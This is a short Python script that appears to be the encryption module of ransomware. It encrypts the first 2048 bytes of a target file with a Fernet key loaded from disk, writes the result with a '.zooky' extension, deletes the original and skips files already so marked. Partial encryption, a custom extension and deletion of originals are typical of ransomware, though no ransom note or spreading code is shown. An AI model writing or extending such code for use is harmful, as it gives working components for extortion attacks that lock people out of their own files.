import os
from cryptography.fernet import Fernet

class StandaloneEncryptor:
    def __init__(self, key):
        self.fernet = Fernet(key)

    def encrypt_file(self, filepath):
        if filepath.endswith('.zooky'):
            print(f"File {filepath} is already encrypted with .zooky extension.")
            return

        with open(filepath, 'rb') as file:
            original = file.read(2048)
            rest_of_file = file.read()
        encrypted = self.fernet.encrypt(original)
        with open(filepath + '.zooky', 'wb') as encrypted_file:
            encrypted_file.write(encrypted + rest_of_file)
        os.remove(filepath)
        print(f"Encrypted {filepath}")

def main():
    key = load_key()
    encryptor = StandaloneEncryptor(key)
    document_path = './standard_alone/document'  # Change this path as needed
    encryptor.encrypt_file(document_path)

def load_key(file_path='filekey.key'):
    with open(file_path, 'rb') as filekey:
        return filekey.read()

if __name__ == "__main__":
    main() 